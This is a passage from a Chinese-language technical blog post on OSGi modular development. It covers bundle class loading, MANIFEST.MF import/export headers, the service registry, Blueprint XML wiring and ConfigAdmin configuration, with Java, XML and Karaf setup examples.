Services)<ul><li>各模块基于不同JVM，甚至可基于不同语言实现。服务见调用存在网络开销，协调许多远程服务之间的通信通常需要异步编程模型并发送消息</li><li>部署基于微服务的系统需要在DevOps方面进行大量工作</li></ul></li><li>也可以选择将两种方法混合使用</li></ul><h3 id="OSGi概念"><a href="#OSGi概念" class="headerlink" title="OSGi概念"></a>OSGi概念</h3><ul><li>OSGI规范提供了<code>Bundle</code>、<code>Event</code>、配置管理（<code>ConfigAdmin</code>）、声明式服务（<code>Delarative Service</code>）、<code>Service Tracker</code>、<code>Blueprint</code>等等运行时机制，方便我们构建模块化的应用系统</li></ul><h4 id="Bundle"><a href="#Bundle" class="headerlink" title="Bundle"></a>Bundle</h4><ul><li>bundle其表现就是一个jar包，如eclipse的一个插件</li><li>OSGI 类加载器并不遵循 Java 的双亲委派模型，OSGi 为每个 bundle 提供一个类加载器，该加载器能够加载 bundle 内部的类和资源，bundle 之间的交互是从一个 bundle 类加载器委托到另一个 bundle 类加载器，所有 bundle 都有一个父类加载器 <a href="https://developer.ibm.com/zh/languages/java/articles/j-springboot-application-integrated-osgi-framework-development/" target="_blank" rel="noopener">^1</a><ul><li>Fragment bundle 是一种特殊的 bundle，不是独立的 bundle，必须依附于其他 bundle 来使用</li><li>由于基于不同的类加载器，如果其中一个模块无法正常运行，不会影响其他模块运行</li></ul></li><li><p>bundle生命周期 <a href="https://course.tianmaying.com/osgi" title="理解OSGi" target="_blank" rel="noopener">^4</a></p><p>  <img src="/data/images/java/osgi-bundle.png" alt="osgi-bundle"></p></li><li>bundle解析优先级<ul><li>已解析的(resolved) &gt; 未解析的(installed)</li><li>相同优先级，有多个匹配时，版本高者优先，版本相同则选最先安装的</li></ul></li><li>OSGi类查找顺序<ul><li>如果类所在包以<code>java.</code>开头，则委托给父类加载</li><li>如果类所在包在导入包中，则委托给导出该包的Bundle</li><li>最后在Bundle自身的类路径上查找</li></ul></li></ul><h4 id="处理模块耦合-依赖"><a href="#处理模块耦合-依赖" class="headerlink" title="处理模块耦合(依赖)"></a>处理模块耦合(依赖)</h4><ul><li>osgi通过import/export package的机制来控制bundle间有限地藕合<ul><li>其他bundle包只能使用明确导出的软件包，<strong>模块化的这一层确保在bundle包之间仅共享API类，并且严格隐藏实现类</strong>，不能使用 <code>new ServiceImpl()</code> 等类似基于实现的代码</li><li>Export/Import package是通过bundle里的<code>META-INF/MANIFEST.MF</code>文件里指定的。如可使用<code>Maven-jar-plugin</code>等插件实现MANIFEST.MF文件的构建</li></ul></li><li>还可以通过osgi service的方式实现藕合 <a href="https://course.tianmaying.com/osgi" title="理解OSGi" target="_blank" rel="noopener">^4</a><ul><li>osgi service是osgi规范中定义的一种本地服务的机制，“本地”意味着它只是在osgi framework内有效，不可跨osgi framework调用，更不可跨JVM调用</li><li>osgi framework有一个service registry,bundle可以把一个实现某种接口的bean实例作为osgi service注册（register）到service registry上，其它bundle就可以从service registry上发现并引用它，所以，本质上osgi service就是一个bean。</li><li>实用案例：我们会把接口定义在一个bundle A里，接口的实现则在另一个bundle B里，并将接口实现实例化后注册成osgi service，而第三个bundle C则引用这个osgi service。因为bundle B和C都需要用到bundle A的接口定义，所以bundle A需export接口定义所在的package，而bundle B和C则需import这个package。这样bundle B和C之间就不需用export/import package来藕合了，实现B和C之间的解藕</li></ul></li></ul><h4 id="MANIFEST-MF文件-Import-Export-package使用"><a href="#MANIFEST-MF文件-Import-Export-package使用" class="headerlink" title="MANIFEST.MF文件(Import/Export package使用)"></a>MANIFEST.MF文件(Import/Export package使用)</h4><ul><li>MANIFEST.MF 文件(一般通过Maven自动生成)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bundle命名空间、名称、版本</span></span><br><span class="line">Bundle-SymbolicName: cn.aezo.osgi-intro-sample-client</span><br><span class="line">Bundle-Name: osgi-intro-sample-client</span><br><span class="line">Bundle-Version: 1.0.0.SNAPSHOT</span><br><span class="line"><span class="comment"># 激活bundle入口类</span></span><br><span class="line">Bundle-Activator: com.baeldung.osgi.sample.client.Client</span><br><span class="line"><span class="comment"># 显示指定Bundle内部类路径, 默认为`.`</span></span><br><span class="line">Bundle-ClassPath: .,other-classes/,embeded.jar</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出. 从而这个package里的类就可以被其它bundle引用了</span></span><br><span class="line">Export-Package：cn.aezo.osgi.demo1</span><br><span class="line"><span class="comment"># 导出指定版本</span></span><br><span class="line">Export-Package：cn.aezo.osgi.demo1;version=<span class="string">"1.0"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入. 从其它bundle导入包之后才能在当前包引用，否则就会出现“ClassNotFound"这样的异常</span></span><br><span class="line">Import-Package：cn.aezo.osgi.demo1</span><br><span class="line"><span class="comment"># 指定导入版本或版本区间. 可实现导入不同版本Jar下的同一个类</span></span><br><span class="line">Import-Package：cn.aezo.osgi.demo1;version=<span class="string">"1.0"</span></span><br><span class="line">Import-Package：cn.aezo.osgi.demo1;vendor=<span class="string">"Sun"</span>;version=<span class="string">"[1.0,2.0)"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用uses子句解决类空间不一致。https://course.tianmaying.com/osgi-toturial+osgi-module-layer#22</span></span><br><span class="line"><span class="comment"># 场景：导出包中的类，其方法签名中包含了其Import-Package中的类；导出包中的类，继承了其Import-Package中的类</span></span><br><span class="line"><span class="comment"># uses约束是可以传递的，工具可自动生成uses</span></span><br><span class="line">Export-Package：org.osgi.service.http;uses:=<span class="string">"javax.servlet"</span>;version=<span class="string">"1.0.0"</span></span><br><span class="line"><span class="comment"># 多个包名之间用逗号隔开","同时，包名可以用";"隔开并加上限定的Attribute</span></span><br><span class="line">Import-Package：javax.servlet;version=<span class="string">"2.3.0"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一行不能超过72个字符，超过部分需要换行，并以一个空格开头</span></span><br><span class="line">Import-Package: com.baeldung.osgi.sample.service.definition;version=<span class="string">"[1.</span></span><br><span class="line"><span class="string"> 0,2)"</span>,org.osgi.framework;version=<span class="string">"[1.8,2)"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dynamic imports和Import-Package的区别是，Import-Package是在Bundle解析时检查的，如果找不到会解析失败。Dynamic imports是在Bundle启动后，代码运行期间，执行到需要加载类的代码时才去检查，如果找不到是一个运行时异常或者错误。可结合`Class.forName("com.mysql.jdbc.Driver").getInstance();`使用</span></span><br><span class="line"><span class="comment"># DynamicImport-Package</span></span><br></pre></td></tr></table></figure><p><a href="/data/images/java/osgi-uses.png">osgi-uses</a></p><h4 id="osgi服务"><a href="#osgi服务" class="headerlink" title="osgi服务"></a>osgi服务</h4><ul><li><code>BundleActivator</code> 定义组件被启动或停止时的动作<ul><li>start</li><li>stop</li></ul></li><li><code>ServiceListener</code> 监听服务状态<ul><li>serviceChanged(ServiceEvent), ServiceEvent包含有REGISTERED(注册)、MODIFIED、UNREGISTERING(注销)、MODIFIED_ENDMATCH</li></ul></li><li><code>ServiceTracker</code> 类</li></ul><h5 id="osgi-service-registry"><a href="#osgi-service-registry" class="headerlink" title="osgi service registry"></a>osgi service registry</h5><ul><li>发布服务 <a href="https://course.tianmaying.com/osgi" title="理解OSGi" target="_blank" rel="noopener">^4</a></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ActivatorA</span> <span class="keyword">implements</span> <span class="title">BundleActivator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">(BundleContext context)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 定义一个Hashtable（Dictionary的子类） props，这个称为“服务属性”，服务属性是一组键值对，每个服务都可以根据需要设置0到n个服务属性</span></span><br><span class="line">        Dictionary&lt;String, String&gt; props = <span class="keyword">new</span> Hashtable&lt;String, String&gt;();</span><br><span class="line">        props.put(<span class="string">"ServiceName"</span>, <span class="string">"MyService"</span>);</span><br><span class="line">        <span class="comment">// 用接口名、实现的实例（instance）和服务属性作为参数，通过BundleContext的registerService的方法将这个实现 注册到OSGI service registry上</span></span><br><span class="line">        <span class="comment">// 之后将项目编译打包成bundle后部署到Karaf，使用如`ls 212`查看，会发现此bundle提供了一个osgi服务（服务接口为cn.aezo.osgi.MyService），服务ID为361，而且还列出了服务属性：ServiceName = MyService</span></span><br><span class="line">        context.registerService(MyService.class.getName(), <span class="keyword">new</span> Calculation(), props);</span><br><span class="line">        System.out.println(<span class="string">"Service registered!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>引用服务</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ActivatorB</span> <span class="keyword">implements</span> <span class="title">BundleActivator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">(BundleContext context)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获得实现服务接口MyService的服务引用，可能有多个</span></span><br><span class="line">        <span class="comment">// 参数1：是服务的接口名</span></span><br><span class="line">        <span class="comment">// 参数2：是一个表达式，它是和服务属性相关的，用于过滤服务。参数2可以如以下的形式："(ServiceName=MyService)"、"&amp;((ServiceName=MyService)(ServiceType=Math))"(符合两个条件)</span></span><br><span class="line">        ServiceReference[] refs = context.getServiceReferences(MyService.class.getName(), <span class="string">"(ServiceName=MyService)"</span>);</span><br><span class="line">        <span class="keyword">if</span>(refs != <span class="keyword">null</span> &amp;&amp; refs.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            MyService service = (MyService) context.getService(refs[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="osgi服务动态性"><a href="#osgi服务动态性" class="headerlink" title="osgi服务动态性"></a>osgi服务动态性</h5><h4 id="Blueprint"><a href="#Blueprint" class="headerlink" title="Blueprint"></a>Blueprint</h4><ul><li>Blueprint <a href="https://course.tianmaying.com/osgi" title="理解OSGi" target="_blank" rel="noopener">^4</a><ul><li>为了适应OSGI的动态环境，spring发展出spring dynamic modules（SpringDM），Blueprint的规范则是来源于SpringDM的进一步发展</li><li>目前，Blueprint规范主要有两个实现：Aries blueprint和Gemini blueprint，它们分别来自Apache和Eclipse两个开源组织</li><li>Blueprint可以象Spring那样，通过XML的方式构建应用，当然也可以通过Blueprint annotation的方式实现同样的目的。由于XML可以和bundle分离，单独部署到servicemix上，所以比annotation的方式更具灵活性，所以我们推荐使用XML的方式</li><li>除了Blueprint之外，OSGI还可以支持Delerative Service（DS）、iPojo等方式，达到类似的功能。但是由于blueprint还可以集成很多功能，例如：Camel。所以推荐使用Blueprint</li></ul></li><li>blueprint是在bundle启动之后（即bundle状态成为ACTIVE）才开始被解析、构建应用，所以，要成功构建bundle的blueprint应用，必须先确保bundle本身能正常启动</li><li>blueprint容器的状态<ul><li><code>GracePeriod</code> blueprint正在等待所需的依赖条件</li><li><code>Creating</code> blueprint已满足了依赖条件，并开始构建blueprint应用</li><li><code>Failure</code> blueprint没法满足所需的依赖条件，或者无法根据xml文档构建相应的应用（可能是xml在语法上有错误）</li><li><code>Created</code> blueprint应用已成功构建</li></ul></li><li>在bundle里，blueprint的xml文档是默认放在jar包里的<code>OSGI-INF/blueprint</code>文件夹里，如果你将它放在其它位置，则需要在manifest.mf里添加一个Bundle-Blueprint的项，例如：<code>Bundle-Blueprint：OSGI-INF/myapplication/*.xml</code></li><li><p>案例</p><ul><li><p>服务端新建<code>resources/OSGI-INF/blueprint/my-service-bp.xml</code>，这个文档就起和spring的ApplicationContext.xml类似的作用</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">blueprint</span> <span class="attr">xmlns</span>=<span class="string">"http://www.osgi.org/xmlns/blueprint/v1.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.osgi.org/xmlns/blueprint/v1.0.0 http://www.osgi.org/xmlns/blueprint/v1.0.0/blueprint.xsd"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 实例化MyService --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"MyServiceImpl"</span> <span class="attr">class</span>=<span class="string">"cn.aezo.osgi.impl.MyServiceImpl"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 发布成OSGI服务。因此就不用在Activator中发布服务了 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">service</span> <span class="attr">id</span>=<span class="string">"MyService"</span> <span class="attr">ref</span>=<span class="string">"MyServiceImpl"</span> <span class="attr">interface</span>=<span class="string">"cn.aezo.osgi.MyService"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">service-properties</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">"ServiceName"</span> <span class="attr">value</span>=<span class="string">"MyService"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">service-properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blueprint</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>客户端新建<code>resources/OSGI-INF/blueprint/my-client-bp.xml</code></p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">blueprint</span> <span class="attr">xmlns</span>=<span class="string">"http://www.osgi.org/xmlns/blueprint/v1.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.osgi.org/xmlns/blueprint/v1.0.0 http://www.osgi.org/xmlns/blueprint/v1.0.0/blueprint.xsd"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--引用服务--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">reference</span> <span class="attr">id</span>=<span class="string">"MyService"</span> <span class="attr">interface</span>=<span class="string">"cn.aezo.osgi.MyService"</span> <span class="attr">filter</span>=<span class="string">"(ServiceName=MyService)"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 实例化 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"MyBean"</span> <span class="attr">class</span>=<span class="string">"cn.aezo.osgi.impl.DIWithBlueprint"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--注入服务引用--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"myService"</span> <span class="attr">ref</span>=<span class="string">"MyService"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blueprint</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>客户端<code>DIWithBlueprint.java</code>接受注入</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DIWithBlueprint</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> MyService myService;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMyService</span><span class="params">(MyService myService)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.myService = myService;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="动态配置"><a href="#动态配置" class="headerlink" title="动态配置"></a>动态配置</h4><ul><li><p>OSGI里面用于操作配置文件(cfg)的接口有2个</p><ul><li><code>org.osgi.service.cm.ManagedService</code> 用于操作单个配置文件</li><li><p><code>org.osgi.service.cm.ManagedServiceFactory</code> 用于操作一组相关的配置文件</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ManagedServiceFactory 参考 https://blog.csdn.net/mn960mn/article/details/50450494</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigManagedExample</span> <span class="keyword">implements</span> <span class="title">ManagedService</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Dictionary 是一个Java抽象类，用来存储键/值对，作用和Map类相似</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updated</span><span class="params">(Dictionary&lt;String, ?&gt; properties)</span> <span class="keyword">throws</span> ConfigurationException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"--------properties被修改，会触发此方法---------"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>基于Blueprint实现动态配置</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">&lt;!-- 新增命名空间cm --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">blueprint</span> <span class="attr">xmlns</span>=<span class="string">"http://www.osgi.org/xmlns/blueprint/v1.0.0"</span></span></span><br><span class="line"><span class="tag">           <span class="attr">xmlns:cm</span>=<span class="string">"http://aries.apache.org/blueprint/xmlns/blueprint-cm/v1.1.0"</span></span></span><br><span class="line"><span class="tag">           <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">           <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.osgi.org/xmlns/blueprint/v1.0.0 http://www.osgi.org/xmlns/blueprint/v1.0.0/blueprint.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">http://aries.apache.org/blueprint/xmlns/blueprint-cm/v1.1.0 http://aries.apache.org/schemas/blueprint-cm/blueprint-cm-1.1.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- persistent-id指定了ConfigAdmin对应的service.pid --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 可以尝试将配置文件 cn.aezo.osgi.cm.cfg 编辑好，放到karaf/etc文件夹下，可以看到配置值被重新注入 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">cm:property-placeholder</span> <span class="attr">persistent-id</span>=<span class="string">"cn.aezo.osgi.cm"</span> <span class="attr">update-strategy</span>=<span class="string">"reload"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">cm:default-properties</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">cm:property</span> <span class="attr">name</span>=<span class="string">"package"</span> <span class="attr">value</span>=<span class="string">"cn.aezo.osgi.cm"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">cm:property</span> <span class="attr">name</span>=<span class="string">"version"</span> <span class="attr">value</span>=<span class="string">"1.0"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">cm:property</span> <span class="attr">name</span>=<span class="string">"author"</span> <span class="attr">value</span>=<span class="string">"smalle"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">cm:default-properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">cm:property-placeholder</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"somebean"</span> <span class="attr">class</span>=<span class="string">"cn.aezo.osgi.cm.SomeBean"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"packageVal"</span> <span class="attr">value</span>=<span class="string">"$&#123;package&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"versionVal"</span> <span class="attr">value</span>=<span class="string">"$&#123;version&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"author"</span> <span class="attr">value</span>=<span class="string">"$&#123;author&#125;"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blueprint</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="OSGi示例"><a href="#OSGi示例" class="headerlink" title="OSGi示例"></a>OSGi示例</h2><ul><li>参考：<a href="https://www.baeldung.com/osgi" target="_blank" rel="noopener">https://www.baeldung.com/osgi</a></li><li>示例源码：<a href="https://github.com/oldinaction/smjava/tree/master/osgi" target="_blank" rel="noopener">https://github.com/oldinaction/smjava/tree/master/osgi</a></li><li>常见的OSGi容器Apache Felix和Eclipse’s Equinox。而Eclipse’s Equinox很久没有更新，因此基于Felix容器测试</li><li>下载Felix容器，或者直接下载Apache Karaf容器(推荐，Karaf是基于Felix的OSGi管理平台，包含命令界面)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://karaf.apache.org/get-started.html</span></span><br><span class="line"><span class="comment"># 启动Karaf可测试是否可正常运行. 会进入`karaf@root()&gt;`命令界面</span></span><br><span class="line">bin/karaf.bat start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 KARAF_HOME 环境变量，变把相应bin目录加入到Path下</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 相关目录</span></span><br><span class="line">data/<span class="built_in">log</span> <span class="comment"># 日志目录</span></span><br></pre></td></tr></table></figure><ul><li>引入依赖</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.osgi<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>org.osgi.core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 打包插件，打出来的jar包，MANIFEST.MF中包含了OSGi相关信息 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.felix<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-bundle-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">extensions</span>&gt;</span>true<span class="tag">&lt;/<span class="name">extensions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">instructions</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- 此Bundle的命名空间 cn.aezo.osgi --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Bundle-SymbolicName</span>&gt;</span>$&#123;project.groupId&#125;.$&#123;project.artifactId&#125;<span class="tag">&lt;/<span class="name">Bundle-SymbolicName</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- 此Bundle名称 osgi-intro-sample-service --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Bundle-Name</span>&gt;</span>$&#123;project.artifactId&#125;<span class="tag">&lt;/<span class="name">Bundle-Name</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- 此Bundle版本 1.0-SNAPSHOT --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Bundle-Version</span>&gt;</span>$&#123;project.version&#125;<span class="tag">&lt;/<span class="name">Bundle-Version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">&lt;!-- 激活模块入口 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Bundle-Activator</span>&gt;</span>com.baeldung.osgi.sample.service.implementation.GreeterImpl<span class="tag">&lt;/<span class="name">Bundle-Activator</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Private-Package</span>&gt;</span>com.baeldung.osgi.sample.service.implementation<span class="tag">&lt;/<span class="name">Private-Package</span>&gt;</span></span><br><span class="line">                    <span 